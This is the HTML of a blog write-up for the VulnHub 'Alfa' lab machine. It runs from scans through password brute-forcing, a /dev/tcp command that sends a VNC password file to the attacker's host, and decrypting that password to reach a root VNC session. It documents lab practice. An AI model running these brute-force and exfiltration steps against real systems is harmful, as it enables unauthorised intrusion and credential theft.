<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>VulnHub - Alfa | Ef's log</title><meta name=keywords content="VulnHub,Writeup,Cyber Security,Pentesting"><meta name=description content="Do a simple OSINT to get shell access and VNC hijack"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/vulnhub/alfa/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="VulnHub - Alfa"><meta property="og:description" content="Do a simple OSINT to get shell access and VNC hijack"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/vulnhub/alfa/"><meta property="article:section" content="vulnhub"><meta property="article:published_time" content="2021-06-13T16:55:14+07:00"><meta property="article:modified_time" content="2021-06-13T16:55:14+07:00"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/ophiuchi/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/traverxec/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/heist/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/active/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/shocker/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/atom/"><meta name=twitter:card content="summary"><meta name=twitter:title content="VulnHub - Alfa"><meta name=twitter:description content="Do a simple OSINT to get shell access and VNC hijack"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"VulnHub","item":"https://fahmifj.github.io/vulnhub/"},{"@type":"ListItem","position":2,"name":"VulnHub - Alfa","item":"https://fahmifj.github.io/vulnhub/alfa/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"VulnHub - Alfa","name":"VulnHub - Alfa","description":"Do a simple OSINT to get shell access and VNC hijack","keywords":["VulnHub","Writeup","Cyber Security","Pentesting"],"articleBody":"Alfa starts with enumeration on FTP to obtain a username and an image file which named after a pet. It continues with finding a hidden path to intranet chat support from robots.txt file . The chat conversation reveals sensitive information and it allows me to guess a user’s password for initial access. In the user’s home directory, there is a VNC password, and it can be used to log into the currently running VNC server as root.\nSkills Learned Generating password list Brute-force FTP and SSH VNC password decrypt SSH tunneling Tools Nmap Hydra Crackmapexec Gobuster Brainfuck decoder - https://www.dcode.fr/brainfuck-language VNCviewer pspy Reconnaissance Nmap An initial scan with nmap discovers four open ports: FTP on port 21, HTTP on port 80, SMB on port 139 and 445.\n→ root@iamf «alfa» «192.168.2.103» $ nmap -sC -sV -oA nmap/10-initial-alfa 192.168.2.109 -v # Nmap 7.80 scan initiated Thu Apr 22 02:41:12 2021 as: nmap -sC -sV -oA nmap/10-initial-alfa -v 192.168.2.109 Nmap scan report for 192.168.2.109 Host is up (0.00056s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwxr-xr-x 2 0 0 4096 Dec 17 13:02 thomas | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:192.168.2.103 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 80/tcp open http Apache httpd 2.4.38 ((Debian)) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Alfa IT Solutions 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP) MAC Address: 08:00:27:9C:8A:46 (Oracle VirtualBox virtual NIC) Service Info: Host: ALFA; OS: Unix Host script results: |_clock-skew: mean: -40m01s, deviation: 1h09m16s, median: -2s | nbstat: NetBIOS name: ALFA, NetBIOS user: , NetBIOS MAC: (unknown) | Names: | ALFA\u003c00\u003e Flags: | ALFA\u003c03\u003e Flags: | ALFA\u003c20\u003e Flags: | \\x01\\x02__MSBROWSE__\\x02\u003c01\u003e Flags: | WORKGROUP\u003c00\u003e Flags: | WORKGROUP\u003c1d\u003e Flags: |_ WORKGROUP\u003c1e\u003e Flags: | smb-os-discovery: | OS: Windows 6.1 (Samba 4.9.5-Debian) | Computer name: alfa | NetBIOS computer name: ALFA\\x00 | Domain name: \\x00 | FQDN: alfa |_ System time: 2021-04-22T08:41:36+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-04-22T06:41:36 |_ start_date: N/A Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Apr 22 02:41:38 2021 -- 1 IP address (1 host up) scanned in 26.16 seconds nmap identified anonymous access is allowed on FTP.\nPerforming a full port scan, discovers the fifth port.\n→ root@iamf «alfa» «192.168.2.103» $ nmap -p- nmap/10-allports-alfa 192.168.2.109 -v Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-22 02:53 EDT Nmap scan report for 192.168.2.109 Host is up (0.00040s latency). Not shown: 65530 closed ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 139/tcp open netbios-ssn 445/tcp open microsoft-ds 65111/tcp open unknown MAC Address: 08:00:27:9C:8A:46 (Oracle VirtualBox virtual NIC) Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 36.32 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB) Poking port 65111 with nc reveals it’s SSH.\n→ root@iamf «alfa» «192.168.2.103» $ nc 192.168.2.109 65111 SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2 Enumeration TCP 21 - FTP Enumeration with on FTP discovers a potential username called thomas, an image file named milo.jpg.\n→ root@iamf «alfa» «192.168.2.103» $ ftp 192.168.2.109 Connected to 192.168.2.109. 220 (vsFTPd 3.0.3) Name (192.168.2.109:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 0 4096 Dec 17 13:02 thomas 226 Directory send OK. ftp\u003e cd thomas 250 Directory successfully changed. ftp\u003e dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 104068 Dec 17 12:49 milo.jpg milo.jpg is a picture of a dog.\nTCP 445 - SMB On SMB, anonymous access is allowed but no read permission there.\n→ root@iamf «alfa» «192.168.2.103» $ crackmapexec smb 192.168.2.109 -u 'ANONYMOUS' -p '' --shares SMB 192.168.2.109 445 ALFA [*] Windows 6.1 (name:ALFA) (domain:) (signing:False) (SMBv1:True) SMB 192.168.2.109 445 ALFA [+] \\ANONYMOUS: SMB 192.168.2.109 445 ALFA [+] Enumerated shares SMB 192.168.2.109 445 ALFA Share Permissions Remark SMB 192.168.2.109 445 ALFA ----- ----------- ------ SMB 192.168.2.109 445 ALFA print$ Printer Drivers SMB 192.168.2.109 445 ALFA IPC$ IPC Service (Samba 4.9.5-Debian) TCP 80 - Web Visiting port 80 shows a website titled with “Alfa IT Solutions”.\nNothing useful on the page source.\nGobuster gobuster scan discovers a robot.txt file\n→ root@iamf «alfa» «192.168.2.103» $ gobuster dir -u http://192.168.2.109/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -o gobuster/gobuster-L-80 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.2.109/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: html,txt,bak [+] Timeout: 10s =============================================================== 2021/04/22 02:46:48 Starting gobuster in directory enumeration mode =============================================================== /js (Status: 301) [Size: 311] [--\u003e http://192.168.2.109/js/] /images (Status: 301) [Size: 315] [--\u003e http://192.168.2.109/images/] /css (Status: 301) [Size: 312] [--\u003e http://192.168.2.109/css/] /index.html (Status: 200) [Size: 3870] /fonts (Status: 301) [Size: 314] [--\u003e http://192.168.2.109/fonts/] /robots.txt (Status: 200) [Size: 459] /server-status (Status: 403) [Size: 278] robots.txt Accessing robots.txt discovers some directories. But, these are just dummy.\nPoking the robots.txt file with curl discovers a string which looks like a brainfuck language.\n→ root@iamf «alfa» «192.168.2.103» $ curl -s http://192.168.2.109/robots.txt /home #404 /admin #404 /login #404 /images #200, directory listing, nothing interesting /cgi-bin #404 /intranet #404 /wp-admin #404 /wp-login #404 ...... ++++++++++[\u003e+\u003e+++\u003e+++++++\u003e++++++++++\u003c\u003c\u003c\u003c-]\u003e\u003e+++++++++++++++++.\u003e\u003e---.+++++++++++.------.-----.\u003c\u003c--.\u003e\u003e++++++++++++++++++.++.-----..-.+++.++. Using this site, the string gets translated as /alfa-support .\n/alfa-support On /alfa-support, there is a chat between Thomas as the employee and the IT support operator (I think?).\nFrom the conversation above, I’ll note that Thomas uses a password that consists of his(or her?) pet’s name followed by 3 numerical digits.\nFoothold Shell as Thomas Creating Wordlist From the previous FTP enumeration, ‘milo’ is most likely the name of Thomas’s pet. With bash, I could generate all the possible password used by Thomas.\n→ root@iamf «alfa» «192.168.2.103» $ for i in {000..999}; do echo \"milo$i\"; done | tee passwords milo000 milo001 milo002 milo003 ...... Brute force - FTP I tried it with Hydra on FTP but returns nothing.\n→ root@iamf «alfa» «192.168.2.103» $ hydra -l thomas -P passwords ftp://192.168.2.103 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-22 03:43:09 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task [DATA] attacking ftp://192.168.2.103:21/ [STATUS] 320.00 tries/min, 320 tries in 00:01h, 713 to do in 00:03h, 16 active [STATUS] 317.00 tries/min, 634 tries in 00:02h, 399 to do in 00:02h, 16 active [STATUS] 315.67 tries/min, 947 tries in 00:03h, 86 to do in 00:01h, 16 active 1 of 1 target completed, 0 valid passwords found [WARNING] Writing restore file because 15 final worker threads did not complete until end. [ERROR] 15 targets did not resolve or could not be connected [ERROR] 0 targets did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-22 03:46:35 Brute force - SSH This time I will use crackmapexec , and I will divide the wordlist into two files\npasswords1: 000-500 passwords2: 500-999 → root@iamf «alfa» «192.168.2.103» $ crackmapexec ssh 192.168.2.109 -u thomas -p passwords2 --port 65111 After some minutes it returns one valid combination: thomas:milo666\nSSH - Thomas I’ll just log in via SSH and grabs the flag.\n→ root@iamf «alfa» «192.168.2.103» $ ssh -p 65111 thomas@192.168.2.109 thomas@192.168.2.109's password: Linux Alfa 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 #################################################################### # ,---------------------------, # # | /---------------------\\ | # # | | | | # # | | +----+ | | # # | | |ALFA| | | # # | | +----+ | | # # | | | | # # | \\_____________________/ | # # |___________________________| # # ,---\\_____ [] _______/------, # # / /______________\\ /| # # /___________________________________ / | ___ # # | | | ) # # | _ _ _ [-------] | | ( # # | o o o [-------] | / _)_ # # |__________________________________ |/ / / # # /-------------------------------------/| ( )/ # # /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ / # # /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ / # # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ # # ██╗ ██╗███████╗██╗ ██████╗ ██████╗ ███╗ ███╗███████╗ # # ██║ ██║██╔════╝██║ ██╔════╝██╔═══██╗████╗ ████║██╔════╝ # # ██║ █╗ ██║█████╗ ██║ ██║ ██║ ██║██╔████╔██║█████╗ # # ██║███╗██║██╔══╝ ██║ ██║ ██║ ██║██║╚██╔╝██║██╔══╝ # # ╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗ # # ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝ ╚═╝╚══════╝ # #################################################################### thomas@Alfa:~$ id uid=1000(thomas) gid=1000(thomas) grupos=1000(thomas),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev) thomas@Alfa:~$ ls -l total 4 -rw-r--r-- 1 thomas thomas 1332 dic 20 11:04 user.txt Privilege Escalation Shell as root Internal enumeration In thomas’s home directory, there is a file called .remote-secret and it is owned by root but world-writable.\nthomas@Alfa:~$ ls -la total 40 drwxr-xr-x 4 thomas thomas 4096 dic 20 22:22 . drwxr-xr-x 3 root root 4096 dic 16 07:58 .. -rw------- 1 thomas thomas 4 dic 20 22:22 .bash_history -rw-r--r-- 1 thomas thomas 220 dic 16 07:58 .bash_logout -rw-r--r-- 1 thomas thomas 3526 dic 16 07:58 .bashrc drwx------ 3 thomas thomas 4096 dic 16 21:15 .gnupg drwxr-xr-x 3 thomas thomas 4096 dic 16 20:44 .local -rw-r--r-- 1 thomas thomas 807 dic 16 07:58 .profile -rwxrwxrwx 1 root root 16 dic 17 23:35 .remote_secret -rw-r--r-- 1 thomas thomas 1332 dic 20 11:04 user.txt At first, I assumed it was some kind of service hijacking, but the file contents appeared to be encrypted.\nthomas@Alfa:~$ cat .remote_secret �\"�Cc�\"�Cc Running pspy discovers a VNC server running locally with root access on port 5901.\n2021/04/22 10:47:57 CMD: UID=0 PID=404 | /usr/bin/Xtigervnc :1 -desktop Alfa:1 (root) -auth /root/.Xauthority -geometry 1900x1200 -depth 24 -rfbwait 30000 -rfbauth /root/.vnc/passwd -rfbport 5901 -pn -localhost -SecurityTypes VncAuth VNC Decrypt This .remote_secret is a VNC password file and I could use vncpwd to decrypt it (I’ve also done this previously on HTB: Cascade). I’ll transfer the file to my attacking machine and decrypt it there.\nOn Alfa:\nthomas@Alfa:~$ cat .remote_secret \u003e /dev/tcp/192.168.2.103/9000 On my Kali:\n→ root@iamf «alfa» «192.168.2.103» $ nc -nvlp 9000 \u003e remote_secret listening on [any] 9000 ... connect to [192.168.2.103] from (UNKNOWN) [192.168.2.109] 57532 The file content is decrypted to k!LL3rSs.\n→ root@iamf «alfa» «192.168.2.103» $ ./vncpwd remote_secret Password: k!LL3rSs I tried the password on root, but it didn’t work. The next option here is to access the VNC server using this password.\nAccessing VNC Since the VNC server is not accessible from outside, I’ll need a port forwarding to interact with it.\nOn thomas’s session\nthomas@Alfa:~$ ~C ssh\u003e -L 5901:localhost:5901 Forwarding port. That will create a tunnel from my Kali localhost:5901 =\u003e Alfa’s localhost:5901\nNow I can try to connect to the VNC server using vncviewer (it’s preinstalled on Kali) and supply the remote_secret file to -password option.\n→ root@iamf «alfa» «192.168.2.103» $ vncviewer -passwd remote_secret 127.0.0.1:5901 Connected to RFB server, using protocol version 3.8 Performing standard VNC authentication Authentication successful Desktop name \"Alfa:1 (root)\" VNC server default format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0 Using default colormap which is TrueColor. Pixel format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0 Same machine: preferring raw encoding It opens this Windows, and I’m already on root.\nTo be honest, this is actually guessing.\nAt first I doubt that this remote_secret is shared with root user, but that’s how I pwned this machine.\n","wordCount":"2022","inLanguage":"en","datePublished":"2021-06-13T16:55:14+07:00","dateModified":"2021-06-13T16:55:14+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/vulnhub/alfa/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/vulnhub/>VulnHub</a></div><h1 class=post-title>VulnHub - Alfa</h1><p class=post-description>Do a simple OSINT to get shell access and VNC hijack</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>June 13, 2021</span>&nbsp;&#183;&nbsp;<span class=meta-read>10 min read</span></div><hr><div class=series-info>Series:&nbsp;<a href=https://fahmifj.github.io/series/oscp-like/>OSCP like</a></div></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-21---ftp aria-label="TCP 21 - FTP">TCP 21 - FTP</a></li><li><a href=#tcp-445---smb aria-label="TCP 445 - SMB">TCP 445 - SMB</a></li><li><a href=#tcp-80---web aria-label="TCP 80 - Web">TCP 80 - Web</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-thomas aria-label="Shell as Thomas">Shell as Thomas</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul></li></ul></div></aside><div class=post-content><p>Alfa starts with enumeration on FTP to obtain a username and an image file which named after a pet. It continues with finding a hidden path to intranet chat support from <code>robots.txt</code> file . The chat conversation reveals sensitive information and it allows me to guess a user&rsquo;s password for initial access. In the user&rsquo;s home directory, there is a VNC password, and it can be used to log into the currently running VNC server as root.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>Generating password list</li><li>Brute-force FTP and SSH</li><li>VNC password decrypt</li><li>SSH tunneling</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Nmap</li><li>Hydra</li><li>Crackmapexec</li><li>Gobuster</li><li>Brainfuck decoder - <a href=https://www.dcode.fr/brainfuck-language>https://www.dcode.fr/brainfuck-language</a></li><li>VNCviewer</li><li>pspy</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p>An initial scan with <code>nmap</code> discovers four open ports: FTP on port 21, HTTP on port 80, SMB on port 139 and 445.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class=line><span class=cl>$ nmap -sC -sV -oA nmap/10-initial-alfa 192.168.2.109 -v
</span></span><span class=line><span class=cl><span class=c1># Nmap 7.80 scan initiated Thu Apr 22 02:41:12 2021 as: nmap -sC -sV -oA nmap/10-initial-alfa -v 192.168.2.109</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.2.109
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00056s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>996</span> closed ports
</span></span><span class=line><span class=cl>PORT    STATE SERVICE     VERSION
</span></span><span class=line><span class=cl>21/tcp  open  ftp         vsftpd 3.0.3
</span></span><span class=line><span class=cl><span class=p>|</span> ftp-anon: Anonymous FTP login allowed <span class=o>(</span>FTP code 230<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_drwxr-xr-x    <span class=m>2</span> <span class=m>0</span>        <span class=m>0</span>            <span class=m>4096</span> Dec <span class=m>17</span> 13:02 thomas
</span></span><span class=line><span class=cl><span class=p>|</span> ftp-syst: 
</span></span><span class=line><span class=cl><span class=p>|</span>   STAT: 
</span></span><span class=line><span class=cl><span class=p>|</span> FTP server status:
</span></span><span class=line><span class=cl><span class=p>|</span>      Connected to ::ffff:192.168.2.103
</span></span><span class=line><span class=cl><span class=p>|</span>      Logged in as ftp
</span></span><span class=line><span class=cl><span class=p>|</span>      TYPE: ASCII
</span></span><span class=line><span class=cl><span class=p>|</span>      No session bandwidth limit
</span></span><span class=line><span class=cl><span class=p>|</span>      Session timeout in seconds is <span class=m>300</span>
</span></span><span class=line><span class=cl><span class=p>|</span>      Control connection is plain text
</span></span><span class=line><span class=cl><span class=p>|</span>      Data connections will be plain text
</span></span><span class=line><span class=cl><span class=p>|</span>      At session startup, client count was <span class=m>3</span>
</span></span><span class=line><span class=cl><span class=p>|</span>      vsFTPd 3.0.3 - secure, fast, stable
</span></span><span class=line><span class=cl><span class=p>|</span>_End of status
</span></span><span class=line><span class=cl>80/tcp  open  http        Apache httpd 2.4.38 <span class=o>((</span>Debian<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: OPTIONS HEAD GET POST
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.38 <span class=o>(</span>Debian<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Alfa IT Solutions
</span></span><span class=line><span class=cl>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class=o>(</span>workgroup: WORKGROUP<span class=o>)</span>
</span></span><span class=line><span class=cl>445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian <span class=o>(</span>workgroup: WORKGROUP<span class=o>)</span>
</span></span><span class=line><span class=cl>MAC Address: 08:00:27:9C:8A:46 <span class=o>(</span>Oracle VirtualBox virtual NIC<span class=o>)</span>
</span></span><span class=line><span class=cl>Service Info: Host: ALFA<span class=p>;</span> OS: Unix
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: mean: -40m01s, deviation: 1h09m16s, median: -2s
</span></span><span class=line><span class=cl><span class=p>|</span> nbstat: NetBIOS name: ALFA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class=o>(</span>unknown<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> Names:
</span></span><span class=line><span class=cl><span class=p>|</span>   ALFA&lt;00&gt;             Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   ALFA&lt;03&gt;             Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   ALFA&lt;20&gt;             Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=se>\x</span>01<span class=se>\x</span>02__MSBROWSE__<span class=se>\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span> smb-os-discovery: 
</span></span><span class=line><span class=cl><span class=p>|</span>   OS: Windows 6.1 <span class=o>(</span>Samba 4.9.5-Debian<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Computer name: alfa
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS computer name: ALFA<span class=se>\x</span><span class=m>00</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Domain name: <span class=se>\x</span><span class=m>00</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   FQDN: alfa
</span></span><span class=line><span class=cl><span class=p>|</span>_  System time: 2021-04-22T08:41:36+02:00
</span></span><span class=line><span class=cl><span class=p>|</span> smb-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   account_used: guest
</span></span><span class=line><span class=cl><span class=p>|</span>   authentication_level: user
</span></span><span class=line><span class=cl><span class=p>|</span>   challenge_response: supported
</span></span><span class=line><span class=cl><span class=p>|</span>_  message_signing: disabled <span class=o>(</span>dangerous, but default<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   2.02: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled but not required
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2021-04-22T06:41:36
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl><span class=c1># Nmap done at Thu Apr 22 02:41:38 2021 -- 1 IP address (1 host up) scanned in 26.16 seconds</span>
</span></span></code></pre></div><p><code>nmap</code> identified anonymous access is allowed on FTP.</p><p>Performing a full port scan, discovers the fifth port.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «alfa» «192.168.2.103» 
